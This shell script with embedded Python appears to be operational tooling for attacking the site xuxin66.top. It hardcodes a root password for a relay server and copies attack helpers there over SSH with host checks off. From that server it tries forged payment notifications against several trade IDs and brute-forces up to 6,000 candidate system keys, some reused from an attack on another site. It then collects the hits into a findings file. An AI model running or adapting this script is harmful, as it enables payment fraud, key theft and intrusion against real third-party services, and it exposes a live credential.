#!/bin/bash
set -u
export PATH="/data/venvs/pentest/bin:/data/automation/bin:/usr/bin:$PATH"
OUT=/data/automation/results/xuxin66.top/deep6f_$(date +%Y%m%d_%H%M%S)
mkdir -p "$OUT"
LOG=/data/logs/xuxin66-deep6f.log
exec > >(tee "$LOG") 2>&1
echo OUT=$OUT
JP=124.248.67.170; JP_PASS=UzHlZQDUy7XP
qg(){ /data/automation/bin/qg-proxy-fetch.sh >/dev/null; sshpass -p "$JP_PASS" ssh -o StrictHostKeyChecking=no root@$JP "mkdir -p /data/config /data/tmp; cat > /data/config/proxy.env" < /data/config/proxy.env; }

bash /data/automation/bin/xuxin66_chunk_query.sh "$OUT"

echo "[$(date +%H:%M:%S)] pay+notify"
qg
python3 /data/automation/bin/xuxin66_build_keys.py >/dev/null
head -2000 /data/tmp/xuxin66_syskeys_prio.txt > /data/tmp/xuxin66_d6d_nkeys.txt
sshpass -p "$JP_PASS" scp -o StrictHostKeyChecking=no /data/automation/bin/xuxin66_pay_notify.sh /data/tmp/xuxin66_d6d_nkeys.txt root@$JP:/data/tmp/
for pair in "1310:15" "159:15" "722:15" "160:15" "984:15"; do
  tid=${pair%%:*}; cid=${pair##*:}
  qg
  echo try tid=$tid
  out=$(sshpass -p "$JP_PASS" ssh -o StrictHostKeyChecking=no root@$JP "chmod +x /data/tmp/xuxin66_pay_notify.sh; bash /data/tmp/xuxin66_pay_notify.sh $tid $cid /data/tmp/xuxin66_d6d_nkeys.txt" 2>/dev/null || true)
  echo "$out" | tee -a "$OUT/pay_notify.txt" | grep -E "PAY=|TRADE=|NOTIFYHIT|PAIDQUERY|GS=|INPUT=" | head -20
  echo "$out" | grep -q "TRADE=20" && break
done

echo "[$(date +%H:%M:%S)] syskey"
python3 - <<'PY'
keys=open("/data/tmp/xuxin66_syskeys_prio.txt").read().splitlines()
big="/data/automation/results/youhui1998.top/deep_20260801_015500/syskey_big.txt"
seen=set(keys)
import os
if os.path.isfile(big):
  with open(big,errors="ignore") as f:
    for i,l in enumerate(f):
      if i>=5000: break
      k=l.strip()
      if 1<=len(k)<=64 and k not in seen:
        keys.append(k); seen.add(k)
open("/data/tmp/xuxin66_d6f_syskeys.txt","w").write("\n".join(keys[:6000]))
print(len(keys[:6000]))
PY
sshpass -p "$JP_PASS" scp -o StrictHostKeyChecking=no /data/tmp/xuxin66_d6f_syskeys.txt /data/automation/bin/xuxin66_syskey_fast.sh root@$JP:/data/tmp/
sshpass -p "$JP_PASS" ssh -o StrictHostKeyChecking=no root@$JP "chmod +x /data/tmp/xuxin66_syskey_fast.sh"
for start in $(seq 1 400 6000); do
  end=$((start+399))
  qg
  echo "[$(date +%H:%M:%S)] syskey $start-$end"
  out=$(sshpass -p "$JP_PASS" ssh -o StrictHostKeyChecking=no root@$JP "sed -n '${start},${end}p' /data/tmp/xuxin66_d6f_syskeys.txt > /tmp/skslice.txt; bash /data/tmp/xuxin66_syskey_fast.sh 11240 /tmp/skslice.txt 4" 2>/dev/null || true)
  echo "$out" | tee -a "$OUT/syskey.txt" | tail -5
  if echo "$out" | grep -q "^HIT|"; then
    echo "$out" | grep "^HIT|" | head -1 | cut -d"|" -f3 | tee "$OUT/SYS_KEY.txt"
    break
  fi
done

python3 - <<PY
import os,json
out="$OUT"
f={"syskey":None,"query_hits":[],"notify":[]}
if os.path.isfile(f"{out}/SYS_KEY.txt"): f["syskey"]=open(f"{out}/SYS_KEY.txt").read().strip()
for fn,k,ps in [("query_spray.txt","query_hits",("HTMLHIT","AJAXHIT")),("pay_notify.txt","notify",("NOTIFYHIT","PAIDQUERY","TRADE=")),("syskey.txt","syskey_hit",("HIT|",))]:
  p=f"{out}/{fn}"
  if not os.path.isfile(p): continue
  for ln in open(p,encoding="utf-8",errors="ignore"):
    if any(x in ln for x in ps): f.setdefault(k,[]).append(ln.strip()[:2000])
json.dump(f,open(f"{out}/FINDINGS.json","w"),ensure_ascii=False,indent=2)
open(f"{out}/SUMMARY.md","w").write(f"# deep6f\n\n- OUT: {out}\n- SYS_KEY: `{f.get('syskey')}`\n- query: {len(f.get('query_hits',[]))}\n- notify/pay lines: {len(f.get('notify',[]))}\n")
print(open(f"{out}/SUMMARY.md").read())
PY
echo "===== DONE ===== $OUT"
